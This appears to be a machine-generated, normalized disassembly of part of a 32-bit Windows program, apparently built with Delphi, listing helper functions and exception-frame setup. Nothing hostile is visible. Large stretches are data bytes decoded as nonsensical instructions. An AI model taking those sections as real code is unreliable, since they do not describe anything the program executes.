ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_417724
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_405a20
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_417798
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4177de
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4177e5
retn
mov eax rw-data
call sub_403fa4
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a58
sub_417af0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_417b15
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417b1c
retn
sub_418479
test [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
salc
test [ ecx ] al
or al 0x0
add [ eax ] al
js r-xdata
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
inc ecx
add [ esp + esi - 0x5293ffc0 ] bl
inc ecx
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
pushfd
stosd [ edi ]
inc ecx
add [ esp + ebp * 4 - 0x534bffbf ] ch
inc ecx
add al cl
stosd [ edi ]
inc ecx
add ah bh
lodsd [ esi ]
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx + 0x40040 ] dh
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
sbb dl 0x7
inc ebx
insb
popad
jae r-xdata
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add [ eax + edi * 4 + 0x41 ] ah
add [ eax + 0x41b8 ] bl
mov edx 0xba880041
inc ecx
add [ eax - 0x45 ] cl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esi [ ebx + 0x74 ] 0xf0746e65
test [ ecx ] al
pop es
adc eax 0x746e4954
jb r-xdata
add [ eax ] al
add [ eax - 0x79 ] ch
inc ecx
add [ eax ] dh
add [ eax ] al
add [ ebp + eax * 4 + 0x41 ] dl
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
adc [ ecx + eax * 2 + 0x41acac00 ] bh
outsb
jae r-xdata
dec [ ebx + 0x4185a0c0 ]
add [ eax ] al
add bh bh
imul esi [ ebx + 0x74 ] 0xb4746e65
test [ ecx ] al
in al dx
add [ ecx ] 0x0
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
inc ecx
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
lodsb [ esi ]
scasb [ edi ]
inc ecx
add [ esp + ebp * 4 - 0x4f1bffbf ] ch
inc ecx
add [ eax ] ah
xchg [ ecx ] al
inc eax
xchg [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
inc ecx
add al dl
mov ebx 0xaedc0041
inc ecx
add [ eax ] al
scasd [ edi ]
inc ecx
add [ edi + ebp * 4 ] ah
inc ecx
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
mov [ edx - 0x44b7ffbf ] bh
inc eax
xchg [ ecx ] al
pop es
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
add ah bl
scasd [ edi ]
inc ecx
add [ edx + ebp + 0x40 ] dl
add [ eax - 0x4d ] ch
inc ecx
add [ edx + ebp + 0x40 ] dl
add [ eax - 0x4d ] dh
inc ecx
add al cl
mov bl 0x41
inc eax
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ esi + ebp * 4 - 0x5353ffbf ] ch
inc ecx
add ah ah
mov al 0x41
jae r-xdata
xor al [ esi + 0x100041 ]
add [ eax ] al
js r-xdata
add ah ah
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ eax ] dl
outsb
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax + 0x740041b2 ] al
mov bl 0x41
add al dh
mov ah 0x41
add [ ebp + esi * 4 + 0x41 ] bh
add [ eax - 0x4a ] dl
inc ecx
add [ edx + ebp + 0x40 ] dl
add [ esi + esi * 4 - 0x494bffbf ] al
inc ecx
add [ eax ] cl
mov bh 0x41
add [ edi + esi * 4 - 0x46b3ffbf ] dh
inc ecx
add [ ecx + edi * 4 - 0x45c7ffbf ] ah
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax * 4 + 0xc0041 ] bl
add [ eax ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
test [ ecx ] eax
in al dx
add [ ecx ] 0x0
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
mov esp 0xacac0041
inc ecx
jae r-xdata
add [ ebx + 0x418664c0 ] cl
add [ esi ] cl
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add ah bl
scasd [ edi ]
inc ecx
add [ eax - 0x13ffbe42 ] bh
mov esi 0xbef00041
inc ecx
add ah dh
mov esi 0xb3c80041
inc ecx
add [ eax - 0x40 ] ch
inc ecx
add ah al
rol [ ecx ] 0x98
rol [ ecx ] 0x88
mov edx 0xc1d40041
inc ecx
add [ eax - 0x3e ] cl
inc ecx
add [ esp + edi * 4 + 0x41 ] ch
add [ eax - 0x44 ] bh
inc ecx
add [ edi + ebp * 4 ] ah
inc ecx
add [ edi * 4 - 0x42abffbf ] dl
inc ecx
add al al
mov ebp 0xb3740041
inc ecx
add [ eax - 0x41 ] dl
inc ecx
add [ ebp + esi * 4 + 0x41 ] bh
add [ eax - 0x4a ] dl
inc ecx
add [ edi + edi * 4 - 0x4063ffbf ] cl
inc ecx
add [ esi + esi * 4 - 0x48f7ffbf ] dh
inc ecx
add [ edi + esi * 4 - 0x46b3ffbf ] dh
inc ecx
add [ ecx + edi * 4 - 0x45c7ffbf ] ah
inc ecx
add ah bl
mov esp 0xbcf80041
inc ecx
add al dh
mov edi 0xbe400041
inc ecx
add [ eax ] al
retn 0x41
in al 0xb0
inc ecx
outsb
dec ecx
je r-xdata
mov al 0x41
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add al 0x11
inc eax
add [ eax ] al
add [ eax ] al
add [ ebp - 0x792fffc0 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x79 ] bh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_418527
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
jo r-xdata
imul esi [ ebx + 0x74 ] 0xb4746e65
test [ ecx ] al
in al dx
add [ ecx ] 0x0
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
inc ecx
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
lodsb [ esi ]
scasb [ edi ]
inc ecx
add [ esp + ebp * 4 - 0x4f1bffbf ] ch
inc ecx
add ah bl
scasd [ edi ]
inc ecx
add [ edx + ebp + 0x40 ] dl
add [ eax - 0x4d ] ch
inc ecx
add [ edx + ebp + 0x40 ] dl
add [ eax - 0x4d ] dh
inc ecx
add al cl
mov bl 0x41
add ah ah
mov al 0x41
jb r-xdata
inc eax
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ esi + ebp * 4 - 0x5353ffbf ] ch
inc ecx
jae r-xdata
add [ eax ] al
add [ eax - 0x79 ] ch
inc ecx
add [ eax ] dh
add [ eax ] al
add [ ebp + eax * 4 + 0x41 ] dl
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
adc [ ecx + eax * 2 + 0x41acac00 ] bh
outsb
jae r-xdata
imul esi [ ebx + 0x74 ] 0xf0746e65
test [ ecx ] al
pop es
adc eax 0x746e4954
jb r-xdata
adc [ eax ] eax
add [ edi + ebp ] esi
pushfd
jae sub_418527
add [ eax + r-xdata ] dl
inc ecx
add al dl
mov ebx 0xaedc0041
inc ecx
add [ eax ] al
scasd [ edi ]
inc ecx
add [ edi + ebp * 4 ] ah
inc ecx
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
mov [ edx - 0x44b7ffbf ] bh
inc eax
xchg [ ecx ] al
pop es
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
add [ eax ] ah
xchg [ ecx ] al
inc eax
xchg [ ecx ] al
add [ eax ] al
add [ eax ] al
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4307da82
insb
popad
jae r-xdata
add ah ah
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ eax ] dl
outsb
jae r-xdata
xor al [ esi + 0x100041 ]
add [ eax ] al
js r-xdata
add [ eax + edi * 4 + 0x41 ] ah
add [ eax + 0x41b8 ] bl
mov edx 0xba880041
inc ecx
add [ eax - 0x45 ] cl
jae r-xdata
add [ eax + 0x740041b2 ] al
mov bl 0x41
add al dh
mov ah 0x41
add [ ebp + esi * 4 + 0x41 ] bh
add [ eax - 0x4a ] dl
inc ecx
add [ edx + ebp + 0x40 ] dl
add [ esi + esi * 4 - 0x494bffbf ] al
inc ecx
add [ eax ] cl
mov bh 0x41
add [ edi + esi * 4 - 0x46b3ffbf ] dh
inc ecx
add [ ecx + edi * 4 - 0x45c7ffbf ] ah
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax * 4 + 0xc0041 ] bl
add [ eax ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
test [ ecx ] eax
in al dx
add [ ecx ] 0x0
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
dec [ ebx + 0x4185a0c0 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
mov esp 0xacac0041
inc ecx
jae r-xdata
add [ ebx + 0x418664c0 ] cl
add [ esi ] cl
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add ah bl
scasd [ edi ]
inc ecx
add [ eax - 0x13ffbe42 ] bh
mov esi 0xbef00041
inc ecx
add ah dh
mov esi 0xb3c80041
inc ecx
add [ eax - 0x40 ] ch
inc ecx
add ah al
rol [ ecx ] 0x98
rol [ ecx ] 0x88
mov edx 0xc1d40041
inc ecx
add [ eax - 0x3e ] cl
inc ecx
add [ esp + edi * 4 + 0x41 ] ch
add [ eax - 0x44 ] bh
inc ecx
add [ edi + ebp * 4 ] ah
inc ecx
add [ edi * 4 - 0x42abffbf ] dl
inc ecx
add al al
mov ebp 0xb3740041
inc ecx
add [ eax - 0x41 ] dl
inc ecx
add [ ebp + esi * 4 + 0x41 ] bh
add [ eax - 0x4a ] dl
inc ecx
add [ edi + edi * 4 - 0x4063ffbf ] cl
inc ecx
add [ esi + esi * 4 - 0x48f7ffbf ] dh
inc ecx
add [ edi + esi * 4 - 0x46b3ffbf ] dh
inc ecx
add [ ecx + edi * 4 - 0x45c7ffbf ] ah
inc ecx
add ah bl
mov esp 0xbcf80041
inc ecx
add al dh
mov edi 0xbe400041
inc ecx
add [ eax ] al
retn 0x41
in al 0xb0
inc ecx
outsb
dec ecx
je r-xdata
mov al 0x41
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add al 0x11
inc eax
add [ eax ] al
add [ eax ] al
add [ ebp - 0x792fffc0 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x79 ] bh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4187fe
inc ecx
add [ eax ] ah
les eax [ ecx ]
pop es
push esp
push ebx
je r-xdata
push ebx
je r-xdata
popad
insd
pop eax
mov [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
ror [ eax + 0x41 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
mov [ ecx ] al
or [ eax ] al
add [ eax ] al
or al 0x88
inc ecx
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
mov al 0xc8
inc ecx
add [ eax - 0x23ffbe3e ] bl
mov [ ecx ] 0xf0
mov [ ecx ] 0x90
mov [ ecx ] 0xa0
mov [ ecx ] 0x9c
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x88
inc ecx
add [ eax + eax ] al
add [ eax ] al
inc eax
adc [ eax ] eax
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax - 0x1bffbe3e ] bl
retn 0x41
inc ecx
add [ eax ] cl
add [ eax ] al
add [ edi + eax * 4 + 0x349c0041 ] bl
inc eax
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax - 0x23ffbe3e ] bl
mov [ ecx ] 0xf0
mov [ ecx ] 0x90
mov [ ecx ] 0xa0
mov [ ecx ] 0x9c
retn
insd
dec ebp
insd
outsd
jb r-xdata
popad
insd
inc esp
mov [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
mov [ ecx ] eax
adc [ eax ] al
add [ eax ] al
pushfd
xchg [ ecx ] eax
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax - 0x1bffbe3e ] bl
retn 0x41
jns r-xdata
push ebx
je r-xdata
cwde
retn 0x41
je r-xdata
insd
outsd
jb r-xdata
popad
insd
ror [ ecx + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
mov [ ecx ] eax
adc al 0x0
add [ eax ] al
clc
mov [ ecx ] al
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ eax - 0x37 ] cl
inc ecx
add [ eax - 0x13ffbe3e ] bl
leave
inc ecx
add ah bh
retn 0x41
outsd
jne r-xdata
popad
insd
mov eax eax
cmp al 0x8a
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x76 ] bl
inc ecx
add [ eax ] bl
add [ eax ] al
add al bh
mov [ ecx ] al
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ eax ] ch
int3
push ebx
push ebx
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x24 ]
je r-xdata
arpl [ ebp + 0x53 ] sp
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_418b9d
mov eax [ ecx ]
sbb [ eax ] al
add [ eax ] al
adc al [ fs : eax ]
pushfd
xor al 0x40
add [ eax - 0x6bffbfa6 ] cl
pop edx
inc eax
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add [ edx + ebx * 2 + 0x32080040 ] ah
inc eax
add [ ebx + ecx ] al
inc edx
add [ ebx + ecx ] bh
inc edx
add [ ebx + ecx + 0xc0c0042 ] ah
inc edx
add [ eax - 0xbffbdf4 ] dl
or al 0x42
add ah dh
push cs
inc edx
add [ eax ] al
cmovb eax [ eax ]
or al 0xf
inc edx
add [ eax ] bl
cmovb eax [ eax ]
and al 0xf
inc edx
add [ eax + 0xe00420f ] ah
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 4 + 0x280041 ] bh
add [ eax ] al
inc eax
adc [ eax ] eax
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add al al
int3
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
push eax
mov [ ecx ] es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
mov [ ecx ] es
or [ eax ] al
add [ eax ] al
inc eax
adc [ eax ] eax
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ ebx + ebx * 4 + 0x540c0041 ] ch
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebp + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edx
lea eax [ ecx ]
jl r-xdata
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add [ esp + ecx * 4 + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x2800418c
add [ eax ] al
add [ eax + 0x11 ] al
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
ror ah 0x41
add al ch
int3
add [ eax ] al
pushad
mov [ ecx ] es
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ eax - 0x17ffbe2d ] al
int3
sub_419174
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_40621c
pop edi
pop esi
pop ebx
retn
sub_41919c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406200
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4191c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406224
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4192bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_41a5d0
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403480
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403480
test al al
je r-xdata
sub_41931c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4192bc
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4192bc
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403480
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41938c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403224
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_41a474
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_419408
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
mov eax [ esi + 0x4 ]
call sub_403254
mov eax [ esi + 0x8 ]
call sub_403254
mov eax [ esi + 0xc ]
call sub_403254
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_419448
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_41a5d0
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4031b8
test al al
jne r-xdata
sub_4194a8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_41a5d0
mov edx eax
mov eax ebp
call sub_403480
test al al
jne r-xdata
sub_4194ec
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419587
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031a4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404208
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_419448
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41a474
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41958e
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
sub_4195ac
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_40538c
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4195cc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_41a5d0
mov edx edi
call sub_4195ac
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_41a5d0
mov edx edi
call sub_4195ac
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_41a4c0
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_4195ac
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_41a4c0
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_419670
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
